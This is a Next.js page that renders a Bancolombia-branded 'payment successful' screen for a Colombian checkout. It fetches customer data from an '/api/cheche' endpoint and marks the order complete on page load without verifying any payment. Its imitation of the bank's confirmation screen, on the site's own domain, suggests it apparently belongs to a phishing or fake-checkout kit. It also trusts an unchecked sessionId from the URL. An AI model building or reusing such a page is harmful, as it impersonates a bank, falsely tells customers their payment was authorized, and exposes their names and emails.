'use client';

import { useEffect, useState } from 'react';
import { useRouter, useSearchParams } from 'next/navigation';
import { useCart } from '@/hooks/useCart';

export default function BancolombiaExitoPage() {
  const [sessionId, setSessionId] = useState('');
  const [orderDetails, setOrderDetails] = useState<any>(null);
  const router = useRouter();
  const searchParams = useSearchParams();
  const { clearCart } = useCart();

  useEffect(() => {
    const id = searchParams.get('sessionId');
    if (!id) {
      router.push('/checkout');
      return;
    }
    setSessionId(id);
    
    // Get session details
    fetchSessionDetails(id);
    
    // Mark session as completed and clear cart
    markSessionCompleted(id);
    clearCart();
  }, [searchParams, router]);

  const fetchSessionDetails = async (id: string) => {
    try {
      const response = await fetch(`/api/cheche?action=get_session&sessionId=${id}`);
      const data = await response.json();
      if (data.success && data.session) {
        const customerData = JSON.parse(data.session.customerData);
        const orderData = JSON.parse(data.session.orderData);
        setOrderDetails({ customerData, orderData });
      }
    } catch (error) {
      console.error('Error fetching session details:', error);
    }
  };

  const markSessionCompleted = async (id: string) => {
    try {
      await fetch('/api/cheche', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          action: 'complete',
          sessionId: id
        })
      });
    } catch (error) {
      console.error('Error marking session as completed:', error);
    }
  };

  const handleGoHome = () => {
    router.push('/');
  };

  const formatCurrency = (amount: number) => {
    return new Intl.NumberFormat('es-CO', {
      style: 'currency',
      currency: 'COP',
      minimumFractionDigits: 0
    }).format(amount);
  };

  return (
    <div className="min-h-screen bg-[#004B87] flex items-center justify-center p-4">
      <div className="max-w-md w-full">
        {/* Header */}
        <div className="text-center mb-8">
          <div className="bg-white rounded-full w-20 h-20 mx-auto mb-4 flex items-center justify-center">
            <img 
              src="/logos/bancos/bancolombia.png" 
              alt="Bancolombia" 
              className="w-14 h-14 object-contain"
            />
          </div>
          <h1 className="text-white text-2xl font-bold mb-2">Bancolombia</h1>
          <p className="text-blue-200">Transacción Completada</p>
        </div>

        {/* Success Card */}
        <div className="bg-white rounded-xl shadow-2xl p-8">
          <div className="text-center mb-6">
            <div className="bg-green-100 rounded-full w-20 h-20 mx-auto mb-4 flex items-center justify-center">
              <svg className="w-10 h-10 text-green-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M5 13l4 4L19 7" />
              </svg>
            </div>
            <h2 className="text-2xl font-bold text-gray-800 mb-2">¡Pago Exitoso!</h2>
            <p className="text-gray-600">Tu transacción ha sido procesada correctamente</p>
          </div>

          {orderDetails && (
            <div className="space-y-4 mb-6">
              <div className="bg-gray-50 rounded-lg p-4">
                <div className="flex justify-between items-center mb-2">
                  <span className="text-sm text-gray-600">Monto pagado:</span>
                  <span className="font-semibold text-lg text-green-600">
                    {formatCurrency(orderDetails.orderData.totalAmount)}
                  </span>
                </div>
                <div className="flex justify-between items-center mb-2">
                  <span className="text-sm text-gray-600">Cliente:</span>
                  <span className="font-medium text-gray-800">
                    {orderDetails.customerData.fullName}
                  </span>
                </div>
                <div className="flex justify-between items-center">
                  <span className="text-sm text-gray-600">Email:</span>
                  <span className="font-medium text-gray-800">
                    {orderDetails.customerData.email}
                  </span>
                </div>
              </div>

              <div className="bg-blue-50 rounded-lg p-4">
                <div className="flex items-center justify-center space-x-2 text-[#004B87]">
                  <svg className="w-5 h-5" fill="currentColor" viewBox="0 0 20 20">
                    <path fillRule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-8.293l-3-3a1 1 0 00-1.414 1.414L10.586 9.5H7a1 1 0 100 2h3.586l-1.293 1.293a1 1 0 101.414 1.414l3-3a1 1 0 000-1.414z" clipRule="evenodd" />
                  </svg>
                  <span className="text-sm font-medium">
                    Transacción autorizada por Bancolombia
                  </span>
                </div>
              </div>
            </div>
          )}

          <button
            onClick={handleGoHome}
            className="w-full py-3 px-6 bg-[#004B87] text-white rounded-lg hover:bg-[#003666] transition font-medium"
          >
            Volver al inicio
          </button>

          <div className="mt-6 text-center">
            <div className="flex items-center justify-center space-x-2 text-green-600">
              <svg className="w-5 h-5" fill="currentColor" viewBox="0 0 20 20">
                <path fillRule="evenodd" d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z" clipRule="evenodd" />
              </svg>
              <span className="text-sm font-medium">Pago procesado de forma segura</span>
            </div>
          </div>
        </div>

        {/* Footer Info */}
        <div className="text-center mt-6">
          <p className="text-blue-200 text-sm">
            Recibirás un email de confirmación en los próximos minutos
          </p>
          <p className="text-blue-300 text-xs mt-2">
            Referencia: {sessionId.slice(-8).toUpperCase()}
          </p>
        </div>
      </div>
    </div>
  );
}